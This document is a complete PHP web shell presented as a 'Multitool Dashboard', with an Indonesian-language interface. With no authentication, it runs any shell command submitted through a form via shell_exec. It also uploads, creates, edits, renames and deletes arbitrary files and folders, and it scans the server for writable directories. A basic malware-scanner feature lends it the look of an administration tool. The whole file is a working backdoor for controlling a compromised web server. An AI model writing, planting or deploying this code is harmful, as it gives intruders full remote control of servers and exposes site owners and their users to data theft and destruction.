<?php
error_reporting(0);
set_time_limit(0);

function is_writable_dir($dir) {
    return is_dir($dir) && is_writable($dir);
}

function scan_writable_dirs($path) {
    $writable_dirs = [];
    if (!is_dir($path)) return $writable_dirs;
    $items = @scandir($path);
    if (!$items) return $writable_dirs;

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            if (is_writable($fullPath)) {
                $writable_dirs[] = $fullPath;
            }
            $writable_dirs = array_merge($writable_dirs, scan_writable_dirs($fullPath));
        }
    }
    return $writable_dirs;
}

function scan_for_malware($dir, $extensions = ['php', 'phtml'], $custom_signatures = []) {
    $results = [];
    $risky_functions = array_merge([
        'eval', 'exec', 'passthru', 'shell_exec', 'system', 'base64_decode',
        'gzinflate', 'str_rot13', 'gzuncompress', 'gzdecode', 'create_function',
        'assert', 'preg_replace', 'call_user_func', 'call_user_func_array',
        'ob_start', 'ob_get_contents', 'file_get_contents', 'fopen', 'fwrite',
        'curl_exec', 'curl_multi_exec', 'parse_str', 'putenv', 'proc_open',
        'popen', 'show_source', 'phpinfo', 'dl', 'scandir', 'glob', 'include',
        'require', 'include_once', 'require_once', 'unlink', 'rm -rf', 'wget',
        'curl', 'chmod', 'chown', 'base64_encode', 'ini_set', 'die(', 'exit('
    ], $custom_signatures);

    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)
        );
        foreach ($iterator as $file) {
            if ($file->isFile()) {
                $ext = strtolower($file->getExtension());
                if (in_array($ext, $extensions)) {
                    $path = $file->getPathname();
                    if (filesize($path) > 5 * 1024 * 1024) continue;
                    $content = @file_get_contents($path);
                    if ($content === false) continue;
                    foreach ($risky_functions as $pattern) {
                        if (stripos($content, $pattern) !== false) {
                            $results[] = $path;
                            break;
                        }
                    }
                }
            }
        }
    } catch (Exception $e) {
        $results[] = "Error: " . $e->getMessage();
    }

    return $results;
}

$current_dir = getcwd();
$check_dir = isset($_POST['check_dir']) ? htmlspecialchars($_POST['check_dir'], ENT_QUOTES) : $current_dir;
$writable_dirs = $malware_results = [];
$upload_status = $file_created_status = $dir_created_status = '';

if (isset($_POST['scan'])) {
    $writable_dirs = scan_writable_dirs($check_dir);
}

if (isset($_POST['scan_malware'])) {
    $exts = isset($_POST['extensions']) ? explode(',', $_POST['extensions']) : ['php', 'phtml'];
    $malware_results = scan_for_malware($check_dir, $exts);
}

if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $upload_dir = rtrim($_POST['upload_dir'], '/\\') . '/';
    if (is_writable($upload_dir)) {
        $target_file = $upload_dir . basename($_FILES['file']['name']);
        if (@move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            $upload_status = "<span class='text-green-600 font-medium'>File uploaded to: {$target_file}</span>";
        } else {
            $upload_status = "<span class='text-red-600 font-medium'>Failed to upload file.</span>";
        }
    } else {
        $upload_status = "<span class='text-red-600 font-medium'>Upload directory is not writable!</span>";
    }
}

if (isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (file_exists($deletePath) && @unlink($deletePath)) {
        $upload_status = "<div class='text-green-600'>File berhasil dihapus: <strong>" . htmlspecialchars($deletePath) . "</strong></div>";
    } else {
        $upload_status = "<div class='text-red-600'>File tidak ditemukan atau tidak dapat dihapus.</div>";
    }
}

if (!empty($_POST['filename']) && isset($_POST['content'])) {
    $path = $_POST['path'] ?? $current_dir;
    $filename = $_POST['filename'];
    $content = $_POST['content'];
    $filePath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
    if (@file_put_contents($filePath, $content) !== false) {
        $file_created_status = "<div class='text-green-600'>File berhasil dibuat di: <strong>" . htmlspecialchars($filePath) . "</strong></div>";
    } else {
        $file_created_status = "<div class='text-red-600'>Gagal membuat file.</div>";
    }
}

if (isset($_POST['new_dir']) && !empty($_POST['dir_path'])) {
    $dirPath = rtrim($_POST['dir_path'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $_POST['new_dir'];
    if (!file_exists($dirPath) && @mkdir($dirPath, 0755, true)) {
        $dir_created_status = "<div class='text-green-600'>Direktori berhasil dibuat: <strong>" . htmlspecialchars($dirPath) . "</strong></div>";
    } else {
        $dir_created_status = "<div class='text-red-600'>Direktori sudah ada atau gagal dibuat.</div>";
    }
}

$command_output = '';
if (isset($_POST['run_command']) && !empty($_POST['command'])) {
    $cmd = $_POST['command'];
    $command_output = shell_exec($cmd . ' 2>&1');
}

// fungsi edit dan view
// Fungsi untuk melihat isi file
function view_file_as_text($file_path) {
    if (file_exists($file_path)) {
        // Membaca konten file dan menampilkan dalam tag <pre> agar format tetap
        $file_content = file_get_contents($file_path);
        echo "<textarea name='file_content' class='w-full p-2 border border-gray-300 rounded'>{$file_content}</textarea>";
    } else {
        echo "<p class='text-red-600'>File tidak ditemukan.</p>";
    }
}

// Fungsi untuk mengedit isi file
function edit_file($file_path) {
    if (file_exists($file_path)) {
        // Jika file ada, ambil kontennya
        $file_content = file_get_contents($file_path);

        // Menampilkan form untuk mengedit file
        echo "
            <form method='POST' class='mt-4'>
                <textarea name='file_content' class='w-full p-2 border border-gray-300 rounded'>{$file_content}</textarea>
                <input type='hidden' name='file_path' value='" . htmlspecialchars($file_path) . "' />
                <button type='submit' name='save_file' class='mt-2 px-4 py-2 bg-blue-600 text-white rounded'>Simpan Perubahan</button>
            </form>
        ";
    } else {
        echo "<p class='text-red-600'>File tidak ditemukan.</p>";
    }
}

// Fungsi untuk menyimpan perubahan


function get_file_manager_list($path) {
    $files = $dirs = [];
    $items = @scandir($path);
    if (!$items) return ['files' => $files, 'dirs' => $dirs];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        is_dir($fullPath) ? $dirs[] = $fullPath : $files[] = $fullPath;
    }
    return ['files' => $files, 'dirs' => $dirs];
}

$currentPath = $_GET['path'] ?? $current_dir;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multitool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        function toggle(id) {
            const el = document.getElementById(id);
            el.classList.toggle('hidden');
        }
    </script>
</head>
<body class="bg-gray-100 p-6">
    <div class="max-w-6xl mx-auto bg-white p-6 rounded shadow">
        <h1 class="text-2xl font-bold mb-6 text-indigo-600">🛠 Multitool Dashboard</h1>

  <!-- Buttons -->
<div class="flex flex-wrap gap-4 mb-6">
    <button onclick="toggle('malwareForm')" class="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded">Scan Malware</button>
    <button onclick="toggle('createFileForm')" class="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded">Buat File Baru</button>
    <button onclick="toggle('createDirForm')" class="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded">Buat Direktori Baru</button>
    <button onclick="toggle('scanWritableForm')" class="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded">Scan Writable Dir</button>
    <button onclick="toggle('UploadFile')" class="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded">Upload</button>
    <button onclick="toggle('DeleteFile')" class="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded">Delete</button>
    <button onclick="toggle('commandForm')" class="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded">Command</button>
	<button onclick="toggle('FilemanagerForm')" class="bg-gray-700 hover:bg-gray-800 text-white px-4 py-2 rounded">FileManager</button>
</div>
<?php
// Handle file/folder deletion
if (isset($_POST['delete_file'])) {
    $file = urldecode($_POST['delete_file']);
    if (is_file($file) && unlink($file)) {
        echo "<div class='text-green-600'>File '{$file}' berhasil dihapus.</div>";
    } else {
        echo "<div class='text-red-600'>Gagal menghapus file.</div>";
    }
}

if (isset($_POST['delete_folder'])) {
    $folder = urldecode($_POST['delete_folder']);
    if (is_dir($folder) && rmdir($folder)) {
        echo "<div class='text-green-600'>Folder '{$folder}' berhasil dihapus.</div>";
    } else {
        echo "<div class='text-red-600'>Gagal menghapus folder. Pastikan kosong.</div>";
    }
}

// Handle rename
if (isset($_POST['rename']) && !empty($_POST['rename_path']) && !empty($_POST['new_name'])) {
    $old_path = urldecode($_POST['rename_path']);
    $new_name = basename($_POST['new_name']);
    $new_path = dirname($old_path) . '/' . $new_name;

    if (rename($old_path, $new_path)) {
        echo "<div class='text-green-600'>Berhasil diubah menjadi '{$new_name}'</div>";
    } else {
        echo "<div class='text-red-600'>Gagal mengganti nama.</div>";
    }
}

?>
    <?php
if (isset($_GET['view'])) {
    $file_path = urldecode($_GET['view']);
    view_file_as_text($file_path);  // Menampilkan isi file sebagai teks
} elseif (isset($_GET['edit'])) {
    $file_path = urldecode($_GET['edit']);
    edit_file($file_path);  // Menampilkan form untuk mengedit file
}
if (isset($_POST['save_file'])) {
    $file_path = $_POST['file_path'];
    $file_content = $_POST['file_content'];
    
    // Menyimpan perubahan ke file
    if (file_put_contents($file_path, $file_content) !== false) {
        echo "<p class='text-green-600'>Perubahan berhasil disimpan!</p>";
    } else {
        echo "<p class='text-red-600'>Gagal menyimpan perubahan.</p>";
    }
}
    ?>
<!-- Writable Scanner -->
<div id="scanWritableForm" class="hidden mb-4">
    <form method="POST">
        <label class="block mb-2">Direktori yang ingin discan:</label>
        <input type="text" name="check_dir" class="p-2 border w-full mb-2" value="<?= htmlspecialchars($check_dir) ?>">
        <button type="submit" name="scan" class="bg-green-600 text-white px-4 py-2 rounded">Scan Writable</button>
    </form>
</div>

<?php if (!empty($writable_dirs)): ?>
    <ul class="bg-green-50 p-4 rounded">
        <?php foreach ($writable_dirs as $dir): ?>
            <li class="text-sm">📂 <?= htmlspecialchars($dir) ?></li>
        <?php endforeach; ?>
    </ul>
<?php endif; ?>

<!-- Form Scan Malware -->
<div id="malwareForm" class="hidden mb-4">
    <form method="POST">
        <label class="block mb-2 text-gray-700 font-semibold">Direktori yang ingin discan:</label>
        <input type="text" name="check_dir" class="p-2 border w-full mb-2" value="<?= htmlspecialchars($check_dir ?? '') ?>" required>

        <label class="block mb-2 text-gray-700 font-semibold">Ekstensi File (pisahkan dengan koma):</label>
        <input type="text" name="extensions" class="p-2 border w-full mb-2" placeholder="Contoh: php,phtml,html" value="<?= htmlspecialchars($_POST['extensions'] ?? '') ?>">

        <button type="submit" name="scan_malware" class="bg-red-600 text-white px-4 py-2 rounded">Scan</button>
    </form>
</div>
<?php
if (isset($_POST['scan_malware'])) {
    $check_dir = $_POST['check_dir'] ?? '.';
    $extensions = array_filter(array_map('trim', explode(',', $_POST['extensions'] ?? 'php,phtml')));
    $custom_text = array_filter(array_map('trim', explode(',', $_POST['custom_text'] ?? '')));

    $malware_results = scan_for_malware($check_dir, $extensions, $custom_text);

    if (!empty($malware_results)) {
        echo '<ul class="bg-red-100 p-4 rounded mt-4">';
        foreach ($malware_results as $file) {
            echo "<li class='text-sm text-red-700'>⚠️ " . htmlspecialchars($file) . "</li>";
        }
        echo '</ul>';
    } else {
        echo '<div class="mt-4 text-green-700">✅ Tidak ada malware terdeteksi.</div>';
    }
}
?>
<!-- Buat Direktori -->
<div id="createDirForm" class="hidden mb-4">
    <form method="POST">
        <input type="text" name="dir_path" class="p-2 border w-full mb-2" placeholder="Path Tujuan">
        <input type="text" name="new_dir" class="p-2 border w-full mb-2" placeholder="Nama Direktori Baru">
        <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded">Buat Direktori</button>
    </form>
</div>
    <?= $dir_created_status ?>


<!-- Buat File -->
<div id="createFileForm" class="hidden mb-4">
    <form method="POST">
        <input type="text" name="path" class="p-2 border w-full mb-2" placeholder="Path">
        <input type="text" name="filename" class="p-2 border w-full mb-2" placeholder="Nama File">
        <textarea name="content" class="p-2 border w-full mb-2" rows="5" placeholder="Isi File"></textarea>
        <button type="submit" class="bg-yellow-600 text-white px-4 py-2 rounded">Buat File</button>
    </form>
</div>
    <?= $file_created_status ?>


<!-- Upload Form -->
<div id="UploadFile" class="hidden mb-4">
    <form method="POST" enctype="multipart/form-data" class="mb-4">
        <h2 class="text-lg font-semibold mb-2 text-gray-700">📤 Upload File</h2>
        <input type="text" name="upload_dir" class="w-full p-2 border mb-2" placeholder="Upload ke direktori" required>
        <input type="file" name="file" class="w-full p-2 border mb-2" required>
        <button type="submit" name="upload" class="bg-indigo-600 text-white px-4 py-2 rounded">Upload</button>
    </form>
</div>
    <?= $upload_status ?>


<!-- Delete File -->
<div id="DeleteFile" class="hidden mb-4">
    <form method="POST">
        <label class="block mb-2">Hapus file:</label>
        <input type="text" name="delete_path" class="p-2 border w-full mb-2" placeholder="Masukkan Path File">
        <button type="submit" class="bg-red-600 text-white px-4 py-2 rounded">Hapus File</button>
    </form>
</div>
    <?= $upload_status ?>


<!-- Execute Command -->
<div id="commandForm" class="hidden mb-4">
    <form method="POST">
        <label class="block mb-2 text-gray-700 font-medium">🖥 Jalankan Command:</label>
        <input type="text" name="command" class="p-2 border w-full mb-2" placeholder="Contoh: ls -la /var/www">
        <button type="submit" name="run_command" class="bg-gray-700 text-white px-4 py-2 rounded">Jalankan</button>
    </form>
</div>
    <?php if (!empty($command_output)): ?>
        <div class="mt-4 bg-black text-green-300 p-4 rounded overflow-auto text-sm whitespace-pre-wrap">
            <?= htmlspecialchars($command_output) ?>
        </div>
    <?php endif; ?>


<!-- File Manager -->
<div id="FilemanagerForm" class="hidden mb-4">
<div class="mb-4">
    <h2 class="text-lg font-semibold mb-2 text-gray-700">📁 File Manager</h2>
    <form method="GET" class="mb-4">
        <input type="text" name="path" class="p-2 border w-full mb-2" value="<?= htmlspecialchars($currentPath) ?>" placeholder="Enter directory path" />
        <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded">Go</button>
    </form>
</div>
</div>
<div class="bg-white shadow-md rounded-lg p-6 mb-6">
    <!-- Home Button -->
    <div class="flex justify-between items-center mb-4">
        <a href="?" class="text-blue-600 hover:text-blue-800 font-medium text-lg">
            <i class="fas fa-home mr-2"></i> Home
        </a>
    </div>

<!-- Directories Section -->
<div class="mb-6">
    <h3 class="font-semibold text-xl text-gray-800 mb-4">Directories</h3>
    <ul class="space-y-3">
        <?php
        $file_manager = get_file_manager_list($currentPath);
        foreach ($file_manager['dirs'] as $dir) {
            $basename = basename($dir);
            $encoded_dir = urlencode($dir);
            echo "
            <li class='flex justify-between items-center bg-gray-100 p-4 rounded-lg hover:bg-gray-200 transition'>
                <a href='?path={$encoded_dir}' class='text-blue-600 hover:text-blue-800 font-medium'>{$basename}</a>
                <div class='flex gap-3'>
                    <form method='POST' class='inline'>
                        <input type='hidden' name='delete_folder' value='{$encoded_dir}' />
                        <button type='submit' class='text-red-600 hover:text-red-800 font-semibold'>Hapus</button>
                    </form>
                    <form method='POST' class='inline flex items-center gap-1'>
                        <input type='hidden' name='rename_path' value='{$encoded_dir}' />
                        <input type='text' name='new_name' placeholder='Nama baru' class='text-sm p-1 border rounded' />
                        <button type='submit' name='rename' class='text-green-600 hover:text-green-800 font-semibold'>Rename</button>
                    </form>
                </div>
            </li>";
        }
        ?>
    </ul>
</div>

<!-- Files Section -->
<div class="bg-gray-50 p-6 rounded-lg shadow-md">
    <h3 class="font-medium text-lg text-gray-800 mb-4">Daftar File</h3>
    <ul class="space-y-4">
        <?php
        foreach ($file_manager['files'] as $file) {
            $basename = basename($file);
            $encoded_path = urlencode($file);
            echo "
            <li class='flex justify-between items-center p-4 bg-white rounded-lg shadow-sm hover:bg-gray-100 transition'>
                <span class='font-medium text-gray-700'>{$basename}</span>
                <div class='flex gap-3'>
                    <a href='?view={$encoded_path}' class='text-blue-600 hover:text-blue-800 font-semibold'>Lihat</a>
                    <a href='?edit={$encoded_path}' class='text-yellow-600 hover:text-yellow-800 font-semibold'>Edit</a>
                    <form method='POST' class='inline'>
                        <input type='hidden' name='delete_file' value='{$encoded_path}' />
                        <button type='submit' class='text-red-600 hover:text-red-800 font-semibold'>Hapus</button>
                    </form>
                    <form method='POST' class='inline flex items-center gap-1'>
                        <input type='hidden' name='rename_path' value='{$encoded_path}' />
                        <input type='text' name='new_name' placeholder='Nama baru' class='text-sm p-1 border rounded' />
                        <button type='submit' name='rename' class='text-green-600 hover:text-green-800 font-semibold'>Rename</button>
                    </form>
                </div>
            </li>";
        }
        ?>
    </ul>
</div>



</div>
</div>
</div>
</body>
</html>
